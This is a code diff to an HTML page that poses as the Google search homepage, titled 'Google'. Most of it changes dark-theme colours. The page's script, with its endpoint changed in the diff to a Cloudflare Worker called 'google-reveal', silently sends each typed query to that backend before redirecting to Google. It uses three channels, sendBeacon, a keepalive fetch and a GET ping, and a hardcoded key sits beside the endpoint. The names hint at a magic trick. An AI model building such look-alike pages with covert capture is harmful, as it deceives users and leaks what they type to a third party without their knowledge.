@@ -4,8 +4,9 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
   <meta name="color-scheme" content="light dark" />
+  <!-- theme-color for browser UI -->
   <meta name="theme-color" content="#ffffff" media="(prefers-color-scheme: light)">
-  <meta name="theme-color" content="#0f1115" media="(prefers-color-scheme: dark)">
+  <meta name="theme-color" content="#3c3c3c" media="(prefers-color-scheme: dark)">
   <title>Google</title>
 
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -21,16 +22,30 @@
       --w:clamp(280px,92vw,600px);
       --shadow: 0 1px 2px rgba(0,0,0,.06), 0 1px 3px rgba(60,64,67,.15);
     }
+    /* DARK THEME (manual) */
     html[data-theme="dark"] {
-      --bg:#0f1115; --text:#e3e3e3; --muted:#b9bcbf; --link:#8ab4f8;
-      --surface:#161a20; --foot:#14171c; --border:#2a2f36; --icon:#a8adb3;
+      --bg:#3c3c3c;        /* requested */
+      --text:#eaeaea;
+      --muted:#c7c7c7;
+      --link:#8ab4f8;
+      --surface:#4a4a4a;   /* slightly lighter than bg for subtle contrast */
+      --foot:#3a3a3a;
+      --border:#5a5a5a;
+      --icon:#d0d0d0;
       --focus: rgba(138,180,248,.26);
       --shadow: 0 1px 10px rgba(0,0,0,.45);
     }
+    /* DARK THEME (auto via prefers-color-scheme) */
     @media (prefers-color-scheme: dark) {
       html[data-theme="auto"] {
-        --bg:#0f1115; --text:#e3e3e3; --muted:#b9bcbf; --link:#8ab4f8;
-        --surface:#161a20; --foot:#14171c; --border:#2a2f36; --icon:#a8adb3;
+        --bg:#3c3c3c;
+        --text:#eaeaea;
+        --muted:#c7c7c7;
+        --link:#8ab4f8;
+        --surface:#4a4a4a;
+        --foot:#3a3a3a;
+        --border:#5a5a5a;
+        --icon:#d0d0d0;
         --focus: rgba(138,180,248,.26);
         --shadow: 0 1px 10px rgba(0,0,0,.45);
       }
@@ -71,14 +86,19 @@
       gap:clamp(18px,4vh,28px);
     }
     .logo { display:grid; place-items:center; width:100%; margin-top:10vh; }
-    .logo img { width:200px; max-width:62vw; height:auto; }
+    .logo img { width:200px; max-width:62vw; height:auto; /* no filters; stays rainbow */ }
 
     .search { position:relative; width:100%; max-width:var(--w); }
     .search input {
       width:100%; height:56px; border-radius:var(--r-pill);
-      border:1px solid var(--border); background:var(--bg); color:var(--text);
+      border:1px solid var(--border);
+      background:var(--bg);      /* stays dark in dark mode */
+      color:var(--text);
       padding:0 98px 0 52px;
       box-shadow:var(--shadow); outline:none; font-size:16px;
+      /* prevent UA default white autofill on some browsers */
+      -webkit-text-fill-color:var(--text);
+      caret-color:var(--text);
     }
     .search input:focus { border-color:transparent; box-shadow:0 0 0 3px var(--focus); }
     .search .material-symbols-outlined {
@@ -154,8 +174,8 @@
       }
     })();
 
-    // ===== Your Apps Script preflight (fires BEFORE Google navigation) =====
-    const ENDPOINT = 'https://script.google.com/macros/s/AKfycbzieLEbtJn_mQvNGiqkTngGAX6uFL1lKP0WWnjQsFMeBklDTcP5aZ9HruOCSQdT03vN/exec';
+    // ===== Cloudflare Worker preflight (fires BEFORE Google navigation) =====
+    const ENDPOINT = 'https://google-reveal.avishaierel.workers.dev';
     const API_KEY  = 'magic-key-2025';
 
     function sendToBackend(q){
@@ -168,7 +188,7 @@
           navigator.sendBeacon(ENDPOINT, blob);
         } else {
           // 2) Fallback: POST fetch with keepalive
-          fetch(ENDPOINT, { method:'POST', body:params, keepalive:true, mode:'cors' }).catch(()=>{});
+          fetch(ENDPOINT + '?' + params.toString(), { method:'POST', body:params, keepalive:true, mode:'cors' }).catch(()=>{});
         }
 
         // 3) GET ping fallback (ensures q shows up even if POST blocked)
@@ -185,7 +205,7 @@
         form.addEventListener('submit', function(){
           const q = (input.value || '').trim();
           if(q){ sendToBackend(q); }
-        }, { capture:true }); // capture to fire as early as possible
+        }, { capture:true }); // fire as early as possible
       }
     })();
   </script>
